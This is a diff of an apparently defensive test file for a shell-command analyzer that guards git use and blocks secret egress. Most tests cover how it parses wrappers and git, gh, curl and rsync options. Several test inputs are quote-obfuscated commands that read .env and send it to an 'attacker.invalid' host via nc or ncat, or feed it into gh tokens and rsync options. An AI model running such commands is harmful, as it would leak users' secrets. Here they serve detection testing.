@@ -1494,7 +1494,7 @@ test('R32 script query after first operand is not permutation/backend proof',()=
 test('R32 script name in printed literal stays data rather than actor',()=>{const r=inspect("printf '%s' 'script -c printf'");assert.equal(r.invocations.some(i=>i.scriptLauncherRole),false);});
 test('R32 revert template is retained object operand without validity claim',()=>{const g=r32RevertCommand("g''it revert --no-edit D");assert.equal(g.operationRole.kind,'object-ref-input');assert.equal(g.operationRole.inputCommits[0].text,'D');assert.equal(g.operationRole.mode,'active');});
 test('R32 revert no-commit remains active index/tree object input',()=>{const g=r32RevertCommand('git revert -n HEAD');assert.equal(g.operationRole.mode,'active');assert.ok(g.operationRole.flags.includes('no-commit'));assert.equal(g.operationRole.inputCommits[0].text,'HEAD');});
-test('R32 revert pure quit is sequencer cleanup with object family inactive',()=>{const g=r32RevertCommand('git revert --quit');assert.equal(g.operationRole,null);assert.equal(g.revertInputRole.mode,'cleanup');assert.equal(g.revertInputRole.objectInputInactive,true);});
+test('R33 revert pure quit retains uninspected autostash child/object context',()=>{const g=r32RevertCommand('git revert --quit');assert.equal(g.operationRole.kind,'object-ref-input');assert.equal(g.revertInputRole.mode,'cleanup');assert.equal(g.revertInputRole.objectInputInactive,false);assert.equal(g.revertInputRole.autostashSourceUninspected,true);});
 test('R32 revert abort remains rollback object/state source',()=>{const g=r32RevertCommand('git revert --abort');assert.equal(g.operationRole.mode,'rollback');assert.equal(g.revertInputRole.objectInputInactive,false);});
 test('R32 revert continue and skip are active resume sources',()=>{for(const mode of ['continue','skip'])assert.equal(r32RevertCommand('git revert --'+mode).operationRole.mode,'resume');});
 test('R32 revert consumed mode-looking mainline is value DATA',()=>{const g=r32RevertCommand('git revert -m --quit HEAD');assert.equal(g.operationRole.mode,'active');assert.equal(g.operationRole.values[0].option,'mainline');assert.equal(g.operationRole.values[0].word.text,'--quit');assert.equal(g.operationRole.flags.includes('quit'),false);});
@@ -1607,3 +1607,279 @@ test('R32 GH token precedence keeps both source names for role-specific consumer
   const invocation = r32MetadataInvocation('GH_TOKEN=ordinary GITHUB_TOKEN=lower gh api --hostname github.com /user', 'gh');
   assert.deepEqual(invocation.outboundEnvironmentSources.filter(item => ['GH_TOKEN', 'GITHUB_TOKEN'].includes(item.name)).map(item => item.name), ['GH_TOKEN', 'GITHUB_TOKEN']);
 });
+
+
+// R33 common v12 finite contracts; command strings are analysis DATA only.
+const r33V12View=s=>inspect(s,{trackOutboundEnvironment:true,initialOutboundEnvironmentNames:[]});
+const r33V12Invocation=(s,n)=>{const x=r33V12View(s).invocations.find(i=>i.name===n&&!i.nonExec);assert.ok(x);return x;};
+const r33V12Merge=s=>{const x=r33V12View(s).gits.find(i=>i.sub==='merge');assert.ok(x);return x;};
+const r33V12Envword=(s,n)=>{const x=r33V12Invocation(s,'gh').outboundEnvironmentSources.find(i=>i.name===n);assert.ok(x);return x.word;};
+test('builtin terminator selects printf and keeps its args',()=>{const x=r33V12Invocation('builtin -- printf %s ordinary','printf');assert.deepEqual(x.wrapperNames,['builtin']);assert.deepEqual(x.args.map(w=>w.text),['%s','ordinary']);});
+test('builtin callee DATA -- is retained',()=>assert.deepEqual(r33V12Invocation('builtin -- printf %s -- eval','printf').args.map(w=>w.text),['%s','--','eval']));
+test('nested builtin terminators retain eval source',()=>{const x=r33V12Invocation('builtin -- builtin -- eval "printf ordinary"','eval');assert.deepEqual(x.wrapperNames,['builtin','builtin']);assert.equal(x.args[0].text,'printf ordinary');});
+test('builtin leading help does not select later eval DATA',()=>{const r=r33V12View('builtin --help eval ordinary');assert.equal(r.invocations.some(i=>i.name==='eval'),false);assert.equal(r.problems.length,0);});
+test('direct function named builtin keeps its own body',()=>{const r=r33V12View('builtin(){ printf ordinary; }; builtin -- eval ordinary');assert.equal(r.invocations.some(i=>i.name==='eval'),false);assert.equal(r.problems.length,0);});
+test('quoted known terminator scalar is reused',()=>assert.equal(r33V12Invocation('T=--; builtin "$T" printf ordinary','printf').launcherUnknown,false));
+test('unproved wrapper boundary stays unknown',()=>assert.ok(r33V12View('builtin "$UNPROVED" printf ordinary').problems.length));
+test('nohup terminator selects its child',()=>{const x=r33V12Invocation('nohup -- printf ordinary','printf');assert.deepEqual(x.wrapperNames,['nohup']);});
+test('nohup child DATA --help remains an argument',()=>assert.deepEqual(r33V12Invocation('nohup -- printf --help --','printf').args.map(w=>w.text),['--help','--']));
+test('nohup early help has no child',()=>{const r=r33V12View('nohup --help printf ordinary');assert.equal(r.invocations.some(i=>i.name==='printf'),false);assert.equal(r.problems.length,0);});
+test('nohup stops option parsing at first operand',()=>assert.deepEqual(r33V12Invocation('nohup printf --version','printf').args.map(w=>w.text),['--version']));
+test('nohup known terminator scalar keeps ordinary child',()=>assert.equal(r33V12Invocation('T=--; nohup "$T" printf ordinary','printf').launcherUnknown,false));
+test('merge retains incoming commit operands',()=>{const r=r33V12Merge('git merge --no-edit --no-ff topic');assert.equal(r.operationRole.kind,'object-ref-input');assert.deepEqual(r.operationRole.inputCommits.map(w=>w.text),['topic']);});
+test('merge rollback and resume are distinct active object contexts',()=>{assert.equal(r33V12Merge('git merge --abort').operationRole.mode,'rollback');assert.equal(r33V12Merge('git merge --continue').operationRole.mode,'resume');});
+test('pure merge quit retains uninspected autostash role',()=>{const r=r33V12Merge('git merge --quit');assert.equal(r.operationRole.kind,'object-ref-input');assert.equal(r.mergeInputRole.objectInputInactive,false);assert.equal(r.mergeInputRole.autostashSourceUninspected,true);});
+test('merge stdout usage remains terminal',()=>{const r=r33V12Merge('git merge -h');assert.equal(r.terminal,true);assert.equal(r.helpKind,'stdout');});
+test('merge message value resembling quit is DATA',()=>{const r=r33V12Merge('git merge -m --quit topic').operationRole;assert.equal(r.mode,'active');assert.deepEqual(r.values.map(x=>[x.option,x.word.text]),[['message','--quit']]);});
+test('merge delimiter makes following help-looking operand DATA',()=>{const r=r33V12Merge('git merge -- -h');assert.notEqual(r.terminal,true);assert.deepEqual(r.operationRole.inputCommits.map(w=>w.text),['-h']);});
+test('merge quit does not remove independent config selections',()=>{const r=r33V12Merge('git -c core.hooksPath=DUMMY merge --quit');assert.ok(r.configSelections.some(x=>x.text==='core.hooksPath=DUMMY'));assert.equal(parseMergeMessageArgs(r.args).editorMayRun,true);});
+test('duplicate shell prefix preserves actual last carrier and offset',()=>{const s='GH_TOKEN=first GH_TOKEN=last gh api /user',w=r33V12Envword(s,'GH_TOKEN');assert.equal(w.text,'last');assert.equal(w.raw,'GH_TOKEN=last');assert.equal(w.start,s.lastIndexOf('GH_TOKEN=last'));});
+test('duplicate env argv retains selected last carrier',()=>assert.equal(r33V12Envword('env GH_TOKEN=first GH_TOKEN=last gh api /user','GH_TOKEN').text,'last'));
+test('sudo assignment argv carries the right selected word',()=>assert.equal(r33V12Envword('sudo GH_TOKEN=first GH_TOKEN=last gh api /user','GH_TOKEN').text,'last'));
+test('earlier shell prefix replacement invalidates old scalar proof',()=>{const w=r33V12Envword('P=old; P=new GH_TOKEN="$P" gh api /user','GH_TOKEN');assert.equal(w.dynamic,true);assert.equal(w.literalValue,undefined);});
+test('env argv expansions do not read earlier env assignment DATA',()=>assert.equal(r33V12Envword('P=old; env P=new GH_TOKEN="$P" gh api /user','GH_TOKEN').literalValue,'old'));
+test('config-env uses its actual last prefix carrier',()=>{const r=r33V12View('H=first H=last git --config-env=http.extraHeader=H ls-remote https://dummy.invalid/repo').gits[0];assert.equal(r.configSelections.find(x=>x.mode==='env').word.text,'last');});
+test('actual env unset removes the selected auth source',()=>assert.equal(r33V12Invocation('env GH_TOKEN=ordinary env -u GH_TOKEN gh api /user','gh').outboundEnvironmentSources.some(x=>x.name==='GH_TOKEN'),false));
+test('separate invocations retain separate prefix sources',()=>{const xs=r33V12View('GH_TOKEN=first gh api /a; GH_TOKEN=last gh api /b').invocations.filter(i=>i.name==='gh');assert.deepEqual(xs.map(i=>i.outboundEnvironmentSources.find(x=>x.name==='GH_TOKEN').word.text),['first','last']);});
+
+test('pure revert quit keeps the shared uninspected autostash source',()=>{const r=r33V12View('git revert --quit').gits[0];assert.equal(r.operationRole.kind,'object-ref-input');assert.equal(r.revertInputRole.objectInputInactive,false);assert.equal(r.revertInputRole.autostashSourceUninspected,true);});
+
+const r33V12Any=s=>r33V12View(s).invocations.find(i=>i.wrapperNames?.length),r33V12G=(s,n)=>r33V12View(s).gits.find(i=>i.sub===n);
+test('rebase active retains incoming objects and no-edit is not query',()=>{const r=r33V12G('git rebase --no-edit --onto HEAD HEAD','rebase');assert.equal(r.operationRole.kind,'object-ref-input');assert.equal(r.operationRole.mode,'active');assert.deepEqual(r.operationRole.inputCommits.map(w=>w.text),['HEAD']);});
+test('rebase quit retains autostash state source',()=>{const r=r33V12G('git rebase --quit','rebase');assert.equal(r.operationRole.mode,'cleanup');assert.equal(r.rebaseInputRole.autostashSourceUninspected,true);});
+test('rebase abort skip continue retain typed lifecycle modes',()=>{for(const [a,m]of [['abort','rollback'],['skip','resume'],['continue','resume']])assert.equal(r33V12G('git rebase --'+a,'rebase').operationRole.mode,m);});
+test('rebase show-current-patch is query child rather than incoming write',()=>{const r=r33V12G('git rebase --show-current-patch','rebase');assert.equal(r.operationRole.mode,'query-source');assert.equal(r.operationRole.kind,'selected-program');assert.equal(r.rebaseInputRole.objectInputInactive,true);assert.equal(r.operationRole.queryProgramUninspected,true);});
+test('rebase exec source stays selected separately',()=>{const r=r33V12G('git rebase --exec "printf ordinary" HEAD','rebase');assert.equal(r.operationRole.kind,'shell-source');assert.equal(r.operationRole.sourceWords[0].text,'printf ordinary');});
+test('rebase mode-looking onto value is consumed DATA',()=>{const r=r33V12G('git rebase --onto --quit HEAD','rebase');assert.equal(r.operationRole.mode,'active');assert.equal(r.operationRole.values[0].word.text,'--quit');});
+test('rebase actual stdout help remains terminal',()=>assert.equal(r33V12G('git rebase -h','rebase').operationRole.terminal,true));
+test('pull no-edit ff no-commit still incoming source',()=>{for(const a of ['--no-edit','--ff-only','--no-commit --no-edit']){const r=r33V12G('git pull '+a+' . topic','pull');assert.equal(r.operationRole.kind,'object-ref-input');assert.deepEqual(r.pullInputRole.inputCommits.map(w=>w.text),['topic']);}});
+test('pull dry-run long and short are fetch-only source',()=>{for(const a of ['--dry-run','-n']){const r=r33V12G('git pull '+a+' . topic','pull');assert.equal(r.operationRole.mode,'fetch-only-source');assert.equal(r.pullInputRole.objectInputInactive,true);}});
+test('pull consumed help value is not terminal',()=>{const r=r33V12G('git pull --upload-pack --help . topic','pull');assert.notEqual(r.operationRole.terminal,true);assert.equal(r.operationRole.values[0].word.text,'--help');});
+test('pull true stdout help remains terminal',()=>assert.equal(r33V12G('git pull -h','pull').operationRole.terminal,true));
+test('time pre-callee delimiter retains child flags DATA',()=>{const i=r33V12Invocation('t\'\'ime -- printf --help --','printf');assert.deepEqual(i.wrapperNames,['time']);assert.deepEqual(i.args.map(w=>w.text),['--help','--']);});
+test('time required short bundled and long output values do not become child',()=>{for(const a of ['-po time.log','-otime.log','--output time.log','--format=--help'])assert.equal(r33V12Invocation('time '+a+' printf ordinary','printf').name,'printf');});
+test('time leading actual query differs from consumed help-looking DATA',()=>{assert.equal(r33V12Any('time --help printf ordinary').nonExec,true);assert.equal(r33V12Invocation('time -o --help printf ordinary','printf').nonExec,false);});
+test('time unknown and missing required values reach shared unknown consumer',()=>{for(const s of ['time --unknown printf ordinary','time -o'])assert.ok(r33V12View(s).problems.length);});
+test('time known standalone scalar delimiter is supported',()=>assert.equal(r33V12Invocation('T=--; time "$T" printf ordinary','printf').launcherUnknown,false));
+test('exec bundled argv0 does not hide selected child',()=>{const i=r33V12Invocation('exec -ca DUMMY printf ordinary','printf');assert.deepEqual(i.args.map(w=>w.text),['ordinary']);});
+test('exec clear env removes exported outbound source only for child',()=>{const i=r33V12Invocation('GH_TOKEN=ordinary exec -c gh api /user','gh');assert.equal(i.outboundEnvironmentSources.some(x=>x.name==='GH_TOKEN'),false);});
+test('exec argv0 help-looking value stays DATA',()=>assert.equal(r33V12Invocation('exec -a --help printf ordinary','printf').nonExec,false));
+test('exec unknown option and missing argv0 remain unsupported',()=>{for(const s of ['exec --unknown printf ordinary','exec -a'])assert.ok(r33V12View(s).problems.length);});
+test('caffeinate bundled value and delimiter retain selected child',()=>{for(const s of ['caffeinate -it 1 printf ordinary','caffeinate -t1 -- printf ordinary'])assert.equal(r33V12Invocation(s,'printf').name,'printf');});
+test('caffeinate query not confused with consumed help DATA',()=>{assert.equal(r33V12Any('caffeinate -h printf ordinary').nonExec,true);assert.equal(r33V12Invocation('caffeinate -t --help printf ordinary','printf').nonExec,false);});
+test('caffeinate unknown or split value is unsupported',()=>{for(const s of ['caffeinate --unknown printf ordinary','caffeinate -t "$DURATION" printf ordinary'])assert.ok(r33V12View(s).problems.length);});
+test('doas bundled user selects child and child flags remain DATA',()=>{const i=r33V12Invocation('doas -nu DUMMY -- printf %s -u','printf');assert.deepEqual(i.args.map(w=>w.text),['%s','-u']);});
+test('doas config validation and credential clear do not launch child',()=>{for(const s of ['doas -C ordinary.conf printf ordinary','doas -L printf ordinary'])assert.equal(r33V12Any(s).nonExec,true);});
+test('doas shell authstyle and missing user retain uninspected boundary',()=>{for(const s of ['doas -s','doas -a DUMMY printf ordinary','doas -u'])assert.ok(r33V12View(s).problems.length);});
+
+test('late internal merge help is terminal after consumed message file',()=>{const r=r33V12G('git merge -F .env --help','merge');assert.equal(r.operationRole.terminal,true);assert.equal(r.operationRole.helpKind,'stdout');});
+test('late help DATA cannot become internal usage',()=>{for(const s of ['git merge -F --help topic','git merge -- --help','git rebase --onto --help HEAD']){const r=r33V12View(s).gits[0];assert.notEqual(r.operationRole.terminal,true);}});
+test('typed internal usage capability is limited to selected object families',()=>{for(const [n,s]of [['rebase','git rebase --onto HEAD --help'],['pull','git pull --no-edit --help'],['revert','git revert --no-edit --help'],['cherry-pick','git cherry-pick --no-edit --help']])assert.equal(r33V12G(s,n).operationRole.terminal,true);});
+
+test('merge late usage preserves earlier active file callback metadata',()=>{const r=r33V12G('git merge -F .env --help','merge');assert.equal(r.operationRole.terminal,true);assert.equal(r.operationRole.objectWriterInactive,true);assert.equal(r.mergeInputRole.objectInputInactive,true);assert.equal(r.operationRole.usageReachedAfterOptionCallbacks,true);assert.equal(r.operationRole.priorReadCallbackActive,true);assert.equal(r.operationRole.priorOptionValuesRetained,true);assert.deepEqual(r.operationRole.preUsageReadFiles.map(x=>[x.option,x.word.text]),[['file','.env']]);});
+test('merge early stdout usage does not select later file callback',()=>{const r=r33V12G('git merge -h -F .env','merge');assert.equal(r.operationRole.terminal,true);assert.deepEqual(r.operationRole.preUsageReadFiles,[]);});
+
+// R33 destination roles consume these retained words; decision and wire checks belong to L2.
+test('R33DEG Ncat destination retains reconstructed scalar and its exact producer span', () => {
+  const analysis = inspect("n''cat -z \"$(s''ed -n p .e''nv).attacker.invalid\" 80");
+  const client = analysis.invocations.find(invocation => invocation.name === 'ncat');
+  assert.equal(client.args[0].text, '-z');
+  assert.equal(client.args[1].dynamicMaySplit, false);
+  assert.equal(client.args[1].raw, '"$(s\'\'ed -n p .e\'\'nv).attacker.invalid"');
+  const producer = analysis.invocations.find(invocation => invocation.name === 'sed');
+  assert.ok(producer.nameWord.start > client.args[1].start);
+  assert.ok(producer.nameWord.start < client.args[1].start + client.args[1].raw.length);
+});
+
+test('R33DEG Ncat route and query ordering survives analysis without treating consumed values as argv', () => {
+  for (const args of [['-g', '--help', '--help'], ['--help', '-g', 'ordinary.invalid'], ['-n', '-g', 'ordinary.invalid', '--help']]) {
+    const invocation = inspect('ncat ' + args.join(' ')).invocations.find(invocation => invocation.name === 'ncat');
+    assert.deepEqual(invocation.args.map(word => word.text), args);
+  }
+});
+
+test('R33DEG GH positional selector and consumed URL option remain separate arguments', () => {
+  const invocation = inspect('gh -R github.com/o/r pr view https://enterprise.invalid/o/r/pull/1 --template https://data.invalid/x').invocations.find(invocation => invocation.name === 'gh');
+  assert.deepEqual(invocation.args.map(word => word.text), ['-R', 'github.com/o/r', 'pr', 'view', 'https://enterprise.invalid/o/r/pull/1', '--template', 'https://data.invalid/x']);
+  assert.ok(invocation.args.every(word => !word.dynamic));
+});
+
+test('R33DEG GH generated auth source keeps its exact exported assignment span', () => {
+  const analysis = inspect('GH_HOST=github.com GH_ENTERPRISE_TOKEN="$(sed -n p .env)" gh pr view https://enterprise.invalid/o/r/pull/1', { trackOutboundEnvironment: true });
+  const invocation = analysis.invocations.find(invocation => invocation.name === 'gh');
+  const source = invocation.outboundEnvironmentSources.find(source => source.name === 'GH_ENTERPRISE_TOKEN').word;
+  assert.equal(source.raw, 'GH_ENTERPRISE_TOKEN="$(sed -n p .env)"');
+  assert.equal(source.dynamicMaySplit, false);
+  assert.equal(source.dynamic, true);
+});
+
+// R33 socket destination classification requires these exact public analysis fields.
+// Shell strings are DATA only; this layer does not execute a socket client.
+test('R33NC nc scalar destination retains the precise reconstructed command and producer span', () => {
+  const analysis = inspect("n''c -z \"$(s''ed -n p .e''nv).attacker.invalid\" 80");
+  const client = analysis.invocations.find(invocation => invocation.name === 'nc');
+  assert.equal(client.args[0].text, '-z');
+  assert.equal(client.args[1].dynamicMaySplit, false);
+  assert.equal(client.args[1].raw, '"$(s\'\'ed -n p .e\'\'nv).attacker.invalid"');
+  const producer = analysis.invocations.find(invocation => invocation.name === 'sed');
+  assert.ok(producer.nameWord.start > client.args[1].start);
+  assert.ok(producer.nameWord.start < client.args[1].start + client.args[1].raw.length);
+});
+test('R33NC telnet bind and destination remain separate source-bearing scalar words', () => {
+  const client = inspect('telnet --bind "$(sed -n p .env).invalid" ordinary.invalid 80').invocations.find(invocation => invocation.name === 'telnet');
+  assert.equal(client.args[0].text, '--bind');
+  assert.equal(client.args[1].dynamicMaySplit, false);
+  assert.equal(client.args[1].dynamic, true);
+  assert.equal(client.args[2].text, 'ordinary.invalid');
+  assert.equal(client.args[2].dynamic, false);
+});
+test('R33NC socket option-ordering selector is presence-sensitive and actual env unset removes it', () => {
+  const get = command => inspect(command, { trackOutboundEnvironment: true }).invocations.find(invocation => invocation.name === 'nc');
+  assert.ok(get('POSIXLY_CORRECT= nc host 80 -h').helperEnvNames.includes('POSIXLY_CORRECT'));
+  assert.ok(!get('POSIXLY_CORRECT=1 env -u POSIXLY_CORRECT nc host 80 -h').helperEnvNames.includes('POSIXLY_CORRECT'));
+});
+test('R33NC socket consumed help DATA and double dash retain their original argument positions', () => {
+  const nc = inspect('nc -p --help -- ordinary.invalid 80').invocations.find(invocation => invocation.name === 'nc');
+  assert.deepEqual(nc.args.map(word => word.text), ['-p', '--help', '--', 'ordinary.invalid', '80']);
+  const telnet = inspect('telnet --user --help -- ordinary.invalid 80').invocations.find(invocation => invocation.name === 'telnet');
+  assert.deepEqual(telnet.args.map(word => word.text), ['--user', '--help', '--', 'ordinary.invalid', '80']);
+});
+
+// GNU no-host command-source decisions require the original input-role metadata.
+test('R33TC reconstructed telnet no-host is distinct from explicit host mode', () => {
+  const command = inspect("t''elnet -c").invocations.find(invocation => invocation.name === 'telnet');
+  assert.deepEqual(command.args.map(word => word.text), ['-c']);
+  const host = inspect("t''elnet -c ordinary.invalid 80").invocations.find(invocation => invocation.name === 'telnet');
+  assert.deepEqual(host.args.map(word => word.text), ['-c', 'ordinary.invalid', '80']);
+});
+test('R33TC direct null and closed fd0 retain proven descriptor identity', () => {
+  const get = command => inspect(command).invocations.find(invocation => invocation.name === 'telnet');
+  const eof = get('telnet </dev/null').redirs[0];
+  assert.equal(eof.fdKnown, true);
+  assert.equal(eof.fd, null);
+  assert.equal(eof.op, '<');
+  assert.equal(eof.word.text, '/dev/null');
+  const closed = get('telnet 0<&-').redirs[0];
+  assert.equal(closed.fdKnown, true);
+  assert.equal(closed.fd, '0');
+  assert.equal(closed.op, '<&');
+  assert.equal(closed.word.text, '-');
+});
+test('R33TC literal whitespace stdin proof retains exact text without execution', () => {
+  const invocation = inspect("telnet <<< ' \t '").invocations.find(invocation => invocation.name === 'telnet');
+  assert.equal(invocation.redirs.length, 1);
+  assert.equal(invocation.redirs[0].fdKnown, true);
+  assert.equal(invocation.redirs[0].op, '<<<');
+  assert.equal(invocation.redirs[0].word.dynamic, false);
+  assert.equal(invocation.redirs[0].word.text, ' \t ');
+});
+test('R33TC printf-v no-output producer retains same-pipeline relationship', () => {
+  const analysis = inspect('printf -v DUMMY ordinary | telnet');
+  const producer = analysis.invocations.find(invocation => invocation.name === 'printf');
+  const client = analysis.invocations.find(invocation => invocation.name === 'telnet');
+  assert.equal(producer.args[0].text, '-v');
+  assert.equal(client.args.length, 0);
+  assert.equal(client.pipelineIds.length, 1);
+  assert.ok(producer.pipelineIds.includes(client.pipelineIds[0]));
+});
+
+// R33 explicit client source/request role inputs; all strings are analysis DATA only.
+const r33ClientInvocation = (source, name) => {
+  const analysis = inspect(source, { trackOutboundEnvironment: true });
+  assert.deepEqual(analysis.problems, []);
+  const invocation = analysis.invocations.find(item => item.name === name && !item.nonExec);
+  assert.ok(invocation);
+  return invocation;
+};
+test('R33 rsync reconstructed program option keeps its selected scalar boundary', () => {
+  const invocation = r33ClientInvocation('r\'\'sync --r\'\'sync-path "$PROGRAM" host:/a ./out', 'rsync');
+  assert.equal(invocation.args[0].text, '--rsync-path');
+  assert.equal(invocation.args[1].raw, '"$PROGRAM"');
+  assert.equal(invocation.args[1].dynamicMaySplit, false);
+  assert.equal(invocation.args[2].text, 'host:/a');
+});
+test('R33 repeated rsync program selectors retain ordered values rather than a first match', () => {
+  const invocation = r33ClientInvocation('rsync --rsync-path "$PROGRAM" --rsync-path ordinary host:/a ./out', 'rsync');
+  assert.deepEqual(invocation.args.map(word => word.text).slice(0, 4), ['--rsync-path', '\0', '--rsync-path', 'ordinary']);
+});
+test('R33 rsync program generator keeps the original producer source span', () => {
+  const source = 'rsync --rsync-path "x$(cat .env)" host:/a ./out';
+  const analysis = inspect(source);
+  const client = analysis.invocations.find(item => item.name === 'rsync');
+  const reader = analysis.invocations.find(item => item.name === 'cat');
+  assert.ok(reader.nameWord.start > client.args[1].start);
+  assert.ok(reader.nameWord.start < client.args[1].start + client.args[1].raw.length);
+});
+test('R33 direct daemon and remote shell address words remain distinct DATA', () => {
+  for (const address of ['host:/a', 'host::module/a', 'rsync://host/module/a']) {
+    const invocation = r33ClientInvocation('rsync --rsync-path ordinary ' + address + ' ./out', 'rsync');
+    assert.equal(invocation.args[2].text, address);
+    assert.equal(invocation.args[2].dynamic, false);
+  }
+});
+test('R33 rsync consumed usage-looking program and argument delimiter retain positions', () => {
+  assert.deepEqual(r33ClientInvocation('rsync --rsync-path --help host:/a ./out', 'rsync').args.map(word => word.text), ['--rsync-path', '--help', 'host:/a', './out']);
+  assert.deepEqual(r33ClientInvocation('rsync host:/a ./out -- --rsync-path', 'rsync').args.map(word => word.text), ['host:/a', './out', '--', '--rsync-path']);
+});
+test('R33 known scalar rsync program retains its value proof', () => {
+  const invocation = r33ClientInvocation('PROGRAM=ordinary; rsync --rsync-path "$PROGRAM" host:/a ./out', 'rsync');
+  assert.equal(invocation.args[1].literalValue, 'ordinary');
+  assert.equal(invocation.args[1].dynamicMaySplit, false);
+});
+test('R33 engine selector and URL remain separate scalar arguments', () => {
+  const invocation = r33ClientInvocation('c\'\'url -q --en\'\'gine "$ENGINE" https://ordinary.invalid', 'curl');
+  assert.equal(invocation.args[1].text, '--engine');
+  assert.equal(invocation.args[2].raw, '"$ENGINE"');
+  assert.equal(invocation.args[2].dynamicMaySplit, false);
+  assert.equal(invocation.args[3].text, 'https://ordinary.invalid');
+});
+test('R33 known scalar engine list retains exact query value proof', () => {
+  const invocation = r33ClientInvocation('ENGINE=list; curl -q --engine "$ENGINE"', 'curl');
+  assert.equal(invocation.args[2].literalValue, 'list');
+  assert.equal(invocation.args[2].dynamicMaySplit, false);
+});
+test('R33 curl next separates ordered operation arguments without hiding selectors', () => {
+  const invocation = r33ClientInvocation('curl -q https://ordinary.invalid --next --engine ordinary', 'curl');
+  assert.deepEqual(invocation.args.map(word => word.text), ['-q', 'https://ordinary.invalid', '--next', '--engine', 'ordinary']);
+});
+test('R33 engine-looking header and short values remain consumed DATA words', () => {
+  assert.deepEqual(r33ClientInvocation('curl -q --header --engine https://ordinary.invalid', 'curl').args.map(word => word.text), ['-q', '--header', '--engine', 'https://ordinary.invalid']);
+  assert.equal(r33ClientInvocation('curl -q -A--engine https://ordinary.invalid', 'curl').args[1].text, '-A--engine');
+});
+test('R33 engine last values and global list token retain exact input order', () => {
+  const invocation = r33ClientInvocation('curl -q --engine ordinary --engine list https://ordinary.invalid', 'curl');
+  assert.deepEqual(invocation.args.map(word => word.text), ['-q', '--engine', 'ordinary', '--engine', 'list', 'https://ordinary.invalid']);
+});
+test('R33 selected SSL backend environment remains a named source distinct from engine DATA', () => {
+  const invocation = r33ClientInvocation('CURL_SSL_BACKEND=openssl curl -q --engine ordinary https://ordinary.invalid', 'curl');
+  const backend = invocation.outboundEnvironmentSources.find(source => source.name === 'CURL_SSL_BACKEND');
+  assert.ok(backend);
+  assert.equal(backend.word.text, 'openssl');
+  assert.equal(backend.word.raw, 'CURL_SSL_BACKEND=openssl');
+  assert.equal(invocation.args[2].text, 'ordinary');
+});
+
+
+{
+const src=require('node:fs').readFileSync(process.env.R33_RP04_EGRESS_SOURCE || require('node:path').join(__dirname,'..','block-secret-egress.cjs'),'utf8');
+const g=require(process.env.R33_RP04_COMMON_SOURCE || require('node:path').join(__dirname,'..','lib','git-guard-common.cjs'));
+const take=(a,b)=>src.slice(src.indexOf(a),src.indexOf(b,src.indexOf(a)));
+const code=take('function knownWord(word)','/** Bash\'s first help/version')+take('function rsyncPoptConfigRole(invocation)','function rsyncRemoteHelper(invocation)')+';globalThis.role=rsyncPoptConfigRole;';const ctx={};require('node:vm').runInNewContext(code,ctx);const role=ctx.role;
+const view=s=>g.inspect(s,{trackOutboundEnvironment:true,initialOutboundEnvironmentNames:[]});
+const from=s=>{const x=view(s).invocations.find(i=>i.name==='rsync'&&!i.definitionName);assert.ok(x);return role(x);};
+test('plain local operands do not reach a popt option selector',()=>assert.equal(from("r''sync a.txt b.txt").active,false));
+test('plain remote operands do not select popt configuration by themselves',()=>assert.equal(from("r''sync host.invalid:/x local.txt").active,false));
+test('known short archive option is a selector before builtin lookup',()=>{const r=from("r''sync -a a.txt b.txt");assert.equal(r.active,true);assert.equal(r.mode,'selector');assert.equal(r.word.text,'-a');});
+test('known long help and version are still selectors',()=>{for(const v of ['--help','--version'])assert.equal(from("r''sync "+v).active,true);});
+test('literal delimiter prevents later help or option-looking DATA selection',()=>{const r=from("r''sync -- --help -a");assert.equal(r.active,false);assert.equal(r.mode,'delimiter');});
+test('one earlier option cannot be cleared by a required value named delimiter',()=>assert.equal(from("r''sync -e -- a.txt b.txt").active,true));
+test('later option after operands remains relevant without a proved POSIX mode',()=>assert.equal(from("r''sync a.txt b.txt -a").active,true));
+test('unknown pre-delimiter argv boundary remains unknown',()=>{const r=from('r\'\'sync $UNPROVED -- a.txt b.txt');assert.equal(r.active,true);assert.equal(r.mode,'unknown-boundary');});
+test('unknown words after actual delimiter cannot create an option selector',()=>assert.equal(from('r\'\'sync -- $UNPROVED').active,false));
+test('last known quoted scalar delimiter is selected from existing proof',()=>assert.equal(from('X=-a; X=--; r\'\'sync "$X" a.txt b.txt').active,false));
+test('last known quoted scalar option remains selected',()=>assert.equal(from('X=--; X=-a; r\'\'sync "$X" a.txt b.txt').active,true));
+test('fixed nonsplitting non-dash generated prefix is not an option proof for other policies',()=>{const r=from('r\'\'sync "a$UNPROVED" b.txt');assert.equal(r.active,false);});
+test('no actual rsync identity is never turned into this source edge',()=>assert.equal(role({name:'printf',args:[]}).active,false));
+test('nonExec definition and known function call all retain their inactive roles',()=>{for(const key of ['nonExec','definitionName','functionCallName'])assert.equal(role({name:'rsync',args:[{text:'-a'}],[key]:true}).active,false);});
+test('final caller is after every original deny and before final allow',()=>{const caller=src.lastIndexOf('if (invocations.some((invocation) => rsyncPoptConfigRole(invocation).active))');assert.ok(caller>src.lastIndexOf('if (remoteWrite || configWrite || pushUrl)'));assert.ok(caller<src.lastIndexOf('process.exit(0)'));});
+}
